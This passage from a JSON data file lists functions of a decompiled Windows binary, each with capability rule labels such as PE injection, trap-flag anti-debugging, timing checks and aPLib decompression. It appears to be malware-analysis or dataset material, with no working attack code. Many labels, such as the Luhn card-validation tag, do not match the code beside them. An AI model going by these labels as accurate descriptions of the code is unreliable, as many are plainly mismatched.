        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004027ec)\n\nvoid __thiscall fcn.00404c5c(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.00403ffc();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.004046c4();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00404b28();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00404c5c();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00404b40();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00405660();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x463008 != NULL) {\n                (**0x463008)();\n            }\n            fcn.004027c0();\n            return;\n        }\n        do {\n            fcn.00404fa4();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 445
    },
    "00419184": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419184(uint param_1, int32_t param_2)\n\n{\n    if ((-0x81 < param_2) && (param_2 < 0x80)) {\n        fcn.004192f4();\n        fcn.0041910c();\n        return;\n    }\n    if ((param_2 < -0x8000) || (0x7fff < param_2)) {\n        fcn.004192f4();\n        fcn.0041910c();\n    }\n    else {\n        fcn.004192f4();\n        fcn.0041910c();\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00406954": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00406954(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX | (param_2 & 0xff0000) << 8;\n}\n",
        "token_count": 56
    },
    "0040b6f0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489",
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid fcn.0040b6f0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iVar1 = fcn.00402898();\n    for (iVar2 = 0; (iVar2 < 7 && (iVar1 != *(iVar2 * 8 + 0x461220))); iVar2 = iVar2 + 1) {\n    }\n    if (iVar2 < 7) {\n        iVar2 = fcn.0040b538();\n    }\n    else {\n        uStack12 = 0;\n        iStack16 = iVar1;\n        iVar2 = fcn.0040b630(0, &iStack16);\n    }\n    *(iVar2 + 0xc) = iVar1;\n    return;\n}\n",
        "token_count": 180
    },
    "0043bd78": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0043bd78(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint32_t uVar1;\n    int32_t in_EDX;\n    uint var_1h;\n    \n    uVar1 = 0;\n    // switch table (7 cases) at 0x43bd93\n    switch(in_CL) {\n    case 1:\n        uVar1 = *(in_EAX + 0x44) < *(in_EDX + 0x44);\n        break;\n    case 2:\n        uVar1 = *(in_EDX + 0x44) + *(in_EDX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 <= *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n        break;\n    case 3:\n        uVar1 = *(in_EAX + 0x40) < *(in_EDX + 0x40);\n        break;\n    case 4:\n        uVar1 = *(in_EDX + 0x40) + *(in_EDX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | uVar1 <= *(in_EAX + 0x40) + *(in_EAX + 0x48);\n        break;\n    case 6:\n        uVar1 = (**(**(arg_8h + -4) + 0xa4))();\n    }\n    return uVar1;\n}\n",
        "token_count": 358
    },
    "004419a8": {
        "rules": [
            "check for trap flag exception/d5d4160e77a5474aa5157e4631e4f1b3"
        ],
        "decompiled_code": "\nvoid fcn.004419a8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x100;\n    fcn.0043de98();\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfeff;\n    return;\n}\n",
        "token_count": 90
    },
    "0040571c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040571c(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 40
    },
    "00401410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401410(int32_t *param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    \n    puVar3 = *in_EAX;\n    *param_1 = *param_2;\n    param_1[1] = param_2[1];\n    do {\n        puVar1 = *puVar3;\n        if (*param_1 == puVar3[2] + puVar3[3]) {\n            fcn.004013f8();\n            *param_1 = puVar3[2];\n            param_1[1] = param_1[1] + puVar3[3];\n        }\n        else if (*param_1 + param_1[1] == puVar3[2]) {\n            fcn.004013f8();\n            param_1[1] = param_1[1] + puVar3[3];\n        }\n        puVar3 = puVar1;\n    } while (in_EAX != puVar1);\n    cVar2 = fcn.004013c8();\n    if (cVar2 == '\\0') {\n        *param_1 = 0;\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "00401514": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401514(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (in_EAX < 0x100000) {\n        uVar3 = 0x100000;\n    }\n    else {\n        uVar3 = in_EAX + 0xffffU & 0xffff0000;\n    }\n    param_2[1] = uVar3;\n    iVar2 = sub.kernel32.dll_VirtualAlloc(0, uVar3, 0x2000, 1);\n    *param_2 = iVar2;\n    if (iVar2 != 0) {\n        cVar1 = fcn.004013c8();\n        if (cVar1 == '\\0') {\n            sub.kernel32.dll_VirtualFree(*param_2, 0, 0x8000);\n            *param_2 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "004016a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004016a8(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    \n    uVar5 = in_EAX & 0xfffff000;\n    uVar3 = in_EAX + param_2 + 0xfff & 0xfffff000;\n    *param_1 = uVar5;\n    param_1[1] = uVar3 - uVar5;\n    puVar6 = *0x4635e8;\n    do {\n        if (puVar6 == 0x4635e8) {\n            return;\n        }\n        uVar1 = puVar6[2];\n        uVar4 = uVar1;\n        if (uVar1 < uVar5) {\n            uVar4 = uVar5;\n        }\n        uVar7 = puVar6[3] + uVar1;\n        if (uVar3 < puVar6[3] + uVar1) {\n            uVar7 = uVar3;\n        }\n        if (uVar4 < uVar7) {\n            puVar8 = uVar7 - uVar4;\n            iVar2 = sub.kernel32.dll_VirtualAlloc(uVar4, puVar8, 0x1000, 4);\n            if (iVar2 == 0) {\n                *puVar8 = 0;\n                return;\n            }\n        }\n        puVar6 = *puVar6;\n    } while( true );\n}\n",
        "token_count": 383
    },
    "0040173c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040173c(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    \n    uVar5 = in_EAX + 0xfffU & 0xfffff000;\n    uVar4 = in_EAX + param_2 & 0xfffff000;\n    *param_1 = uVar5;\n    param_1[1] = uVar4 - uVar5;\n    for (puVar6 = *0x4635e8; puVar6 != 0x4635e8; puVar6 = *puVar6) {\n        uVar1 = puVar6[2];\n        uVar3 = uVar1;\n        if (uVar1 < uVar5) {\n            uVar3 = uVar5;\n        }\n        uVar7 = puVar6[3] + uVar1;\n        if (uVar4 < puVar6[3] + uVar1) {\n            uVar7 = uVar4;\n        }\n        if (uVar3 < uVar7) {\n            iVar2 = sub.kernel32.dll_VirtualFree(uVar3, uVar7 - uVar3, 0x4000);\n            if (iVar2 == 0) {\n                *0x4635c4 = 2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "00401ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401ba0(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    if (in_EAX == *0x463614) {\n        *0x463614 = in_EAX[1];\n    }\n    piVar1 = in_EAX[1];\n    iVar2 = in_EAX[2];\n    if (iVar2 < 0x1001) {\n        if (in_EAX != piVar1) {\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + 3;\n            }\n            *(*0x463620 + -0xc + (iVar2 >> 2) * 4) = piVar1;\n            iVar2 = *in_EAX;\n            *piVar1 = iVar2;\n            *(iVar2 + 4) = piVar1;\n            return;\n        }\n        if (iVar2 < 0) {\n            iVar2 = iVar2 + 3;\n        }\n        *(*0x463620 + -0xc + (iVar2 >> 2) * 4) = 0;\n    }\n    else {\n        iVar2 = *in_EAX;\n        *piVar1 = iVar2;\n        *(iVar2 + 4) = piVar1;\n    }\n    return;\n}\n",
        "token_count": 288
    },
    "00401c04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00401c04(void)\n\n{\n    uint32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = *0x463624;\n    while( true ) {\n        if (puVar1 == 0x463624) {\n            *0x4635c4 = 3;\n            return NULL;\n        }\n        if ((puVar1[2] <= in_EAX) && (in_EAX < puVar1[2] + puVar1[3])) break;\n        puVar1 = *puVar1;\n    }\n    return puVar1;\n}\n",
        "token_count": 132
    },
    "00401c88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401c88(uint param_1, uint32_t param_2)\n\n{\n    uint32_t *in_EAX;\n    \n    if (0xb < param_2) {\n        *in_EAX = param_2 | 2;\n        fcn.00401c64();\n        return;\n    }\n    if (3 < param_2) {\n        *in_EAX = param_2 | 0x80000002;\n    }\n    *(in_EAX + param_2) = *(in_EAX + param_2) & 0xfffffffe;\n    return;\n}\n",
        "token_count": 131
    },
    "00401d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00401d20(void)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    uVar1 = *in_EAX;\n    if ((uVar1 & 0x80000000) != 0) {\n        uVar3 = uVar1 & 0x7ffffffc;\n        in_EAX = in_EAX + uVar3;\n        uVar1 = *in_EAX;\n    }\n    if ((uVar1 & 2) == 0) {\n        fcn.00401ba0();\n        uVar3 = uVar3 + in_EAX[2];\n        puVar2 = in_EAX + in_EAX[2];\n        *puVar2 = *puVar2 & 0xfffffffe;\n    }\n    return uVar3;\n}\n",
        "token_count": 206
    },
    "00401e08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401e08(uint param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    char cVar4;\n    int32_t **in_EAX;\n    \n    in_EAX[2] = param_2;\n    *(in_EAX + param_2 + -4) = param_2;\n    if (param_2 < 0x1001) {\n        if (param_2 < 0) {\n            param_2 = param_2 + 3;\n        }\n        ppiVar1 = *(*0x463620 + -0xc + (param_2 >> 2) * 4);\n        if (ppiVar1 == NULL) {\n            *(*0x463620 + -0xc + (param_2 >> 2) * 4) = in_EAX;\n            in_EAX[1] = in_EAX;\n            *in_EAX = in_EAX;\n        }\n        else {\n            piVar2 = *ppiVar1;\n            in_EAX[1] = ppiVar1;\n            *in_EAX = piVar2;\n            *ppiVar1 = in_EAX;\n            piVar2[1] = in_EAX;\n        }\n    }\n    else {\n        if ((0x3bff < param_2) && (cVar4 = fcn.00401d58(),  cVar4 != '\\0')) {\n            return;\n        }\n        ppiVar1 = *0x463614;\n        piVar2 = **0x463614;\n        ppiVar3 = in_EAX;\n        in_EAX[1] = *0x463614;\n        *0x463614 = ppiVar3;\n        *in_EAX = piVar2;\n        *ppiVar1 = in_EAX;\n        piVar2[1] = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "00401fc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401fc8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (in_EAX < 0) {\n        in_EAX = in_EAX + 3;\n    }\n    iVar1 = in_EAX >> 2;\n    if (iVar1 < 0x401) {\n        do {\n            iVar2 = *(*0x463620 + -0xc + iVar1 * 4);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 != 0x401);\n    }\n    return iVar2;\n}\n",
        "token_count": 162
    },
    "00402854": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402854(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x0040286a:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x00402875;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x0040286a;\n    param_1 = 0;\ncode_r0x00402875:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "004028b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004028b8(uint32_t param_1, uint *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    iVar1 = param_1 >> 2;\n    if (in_EAX < param_2) {\n        puVar2 = (param_1 - 4) + in_EAX;\n        param_2 = (param_1 - 4) + param_2;\n        if (-1 < iVar1) {\n            for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *param_2 = *puVar2;\n                puVar2 = puVar2 + -1;\n                param_2 = param_2 + -1;\n            }\n            puVar3 = puVar2 + 3;\n            puVar4 = param_2 + 3;\n            for (param_1 = param_1 & 3; param_1 != 0; param_1 = param_1 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + -1;\n                puVar4 = puVar4 + -1;\n            }\n        }\n    }\n    else if ((param_2 != in_EAX) && (-1 < iVar1)) {\n        for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *param_2 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n        }\n        for (param_1 = param_1 & 3; param_1 != 0; param_1 = param_1 - 1) {\n            *param_2 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + 1;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "00403220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403220(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x28);\n}\n",
        "token_count": 33
    },
    "00403228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403228(uint param_1, char param_2)\n\n{\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004032dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004032dc(int32_t **param_1, code *UNRECOVERED_JUMPTABLE)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if (UNRECOVERED_JUMPTABLE < 0xff000000) {\n        if (0xfdffffff < UNRECOVERED_JUMPTABLE) {\n    // WARNING: Could not recover jumptable at 0x004032f3. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(UNRECOVERED_JUMPTABLE + *in_EAX))();\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x004032f5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    ppiVar2 = *((UNRECOVERED_JUMPTABLE & 0xffffff) + in_EAX);\n    if (ppiVar2 == NULL) {\n        piVar1 = *param_1;\n        *param_1 = NULL;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n        return;\n    }\n    (*(*ppiVar2)[1])(ppiVar2, param_1, ppiVar2);\n    piVar1 = *ppiVar2;\n    *ppiVar2 = param_1;\n    if (piVar1 == NULL) {\n        return;\n    }\n    (**(*piVar1 + 8))(piVar1);\n    return;\n}\n",
        "token_count": 360
    },
    "004033a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004033a0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    do {\n        piVar1 = *(in_EAX + -0x48);\n        if (piVar1 != NULL) {\n            iVar2 = *piVar1;\n            piVar1 = piVar1 + 1;\n            do {\n                if ((((*param_2 == *piVar1) && (param_2[1] == piVar1[1])) && (param_2[2] == piVar1[2])) &&\n                   (param_2[3] == piVar1[3])) {\n                    return piVar1;\n                }\n                piVar1 = piVar1 + 7;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return NULL;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 252
    },
    "00403424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403424(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint16_t unaff_SI;\n    uint16_t *puVar2;\n    bool bVar3;\n    \n    do {\n        puVar2 = *(in_EAX + -0x30);\n        if (puVar2 != NULL) {\n            uVar1 = *puVar2;\n            bVar3 = puVar2 + 1 == NULL;\n            puVar2 = puVar2 + 1;\n            do {\n                if (uVar1 == 0) break;\n                uVar1 = uVar1 - 1;\n                bVar3 = unaff_SI == *puVar2;\n                puVar2 = puVar2 + 1;\n            } while (!bVar3);\n            if (bVar3) {\n                return;\n            }\n        }\n        if (*(in_EAX + -0x24) == NULL) {\n            return;\n        }\n        in_EAX = **(in_EAX + -0x24);\n    } while( true );\n}\n",
        "token_count": 235
    },
    "00403498": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403498(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -0x3c);\n}\n",
        "token_count": 34
    },
    "004034dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004034dc(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar1 = 0;\n    uVar5 = 0;\n    uVar3 = *param_2;\n    while( true ) {\n        puVar4 = *(in_EAX + -0x34);\n        if (puVar4 != NULL) {\n            uVar5 = uVar5 & 0xffff0000 | *puVar4;\n            puVar4 = puVar4 + 1;\n            do {\n                uVar2 = uVar1 & 0xffffff00;\n                if (*(puVar4 + 3) == uVar3) {\n                    uVar2 = uVar1 & 0xffff0000 | *(puVar4 + 3);\n                    while (((*(uVar2 + 6 + puVar4) ^ param_2[uVar2]) & 0xdf) == 0) {\n                        uVar2 = uVar2 - 1;\n                        if (uVar2 == 0) {\n                            return *(puVar4 + 1);\n                        }\n                    }\n                    uVar3 = *param_2;\n                }\n                uVar1 = uVar2 & 0xffff0000 | *puVar4;\n                puVar4 = puVar4 + uVar1;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (*(in_EAX + -0x24) == NULL) break;\n        in_EAX = **(in_EAX + -0x24);\n    }\n    return 0;\n}\n",
        "token_count": 400
    },
    "00403a0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403a0c(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint *in_FS_OFFSET;\n    uint *in_stack_00000014;\n    int32_t in_stack_00000030;\n    \n    *(in_stack_00000030 + 4) = 0x403a57;\n    piVar3 = fcn.00405d78();\n    piVar2 = *piVar3;\n    *piVar3 = *piVar2;\n    piVar2 = piVar2[3];\n    puVar1 = piVar2 + 1;\n    *puVar1 = *puVar1 & 0xfffffffd;\n    if (*piVar2 != 0xeedfade) {\n        fcn.00403258();\n        fcn.004035f4();\n    }\n    *in_stack_00000014 = **in_FS_OFFSET;\n    return 1;\n}\n",
        "token_count": 215
    },
    "00403d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403d30(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00405b0c();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 75
    },
    "00403d54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403d54(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *in_EAX;\n    do {\n        fcn.00405b0c();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    return;\n}\n",
        "token_count": 75
    },
    "00403d7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403d7c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    \n    iVar2 = *in_EAX;\n    ppiVar1 = in_EAX + 1;\n    do {\n        **ppiVar1 = *ppiVar1[1] + ppiVar1[2];\n        ppiVar1 = ppiVar1 + 3;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 123
    },
    "00403fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403fcc(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    do {\n        iVar2 = *in_EAX;\n        if ((iVar2 != 0) && (*in_EAX = 0,  0 < *(iVar2 + -8))) {\n            LOCK();\n            piVar1 = iVar2 + -8;\n            *piVar1 = *piVar1 + -1;\n            if (*piVar1 == 0) {\n                fcn.004026dc();\n            }\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 181
    },
    "0040406c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0040406c(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    if (0 < in_EAX) {\n        puVar1 = fcn.004026bc();\n        *(((in_EAX + 10U & 0xfffffffe) - 2) + puVar1) = 0;\n        puVar1[1] = in_EAX;\n        *puVar1 = 1;\n        return puVar1 + 2;\n    }\n    return NULL;\n}\n",
        "token_count": 117
    },
    "004041a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004041a0(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = param_2;\n    if (param_2 != NULL) {\n        for (; (((*pcVar2 != '\\0' && (pcVar2[1] != '\\0')) && (pcVar2[2] != '\\0')) && (pcVar2[3] != '\\0'));\n            pcVar2 = pcVar2 + 4) {\n        }\n    }\n    uVar1 = fcn.0040406c();\n    if (param_2 != NULL) {\n        fcn.004028b8();\n    }\n    fcn.00403fa8();\n    *in_EAX = uVar1;\n    return;\n}\n",
        "token_count": 185
    },
    "00404218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404218(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.0040406c();\n    if (param_2 != NULL) {\n        fcn.004028b8();\n    }\n    fcn.00403fa8();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 177
    },
    "00404270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
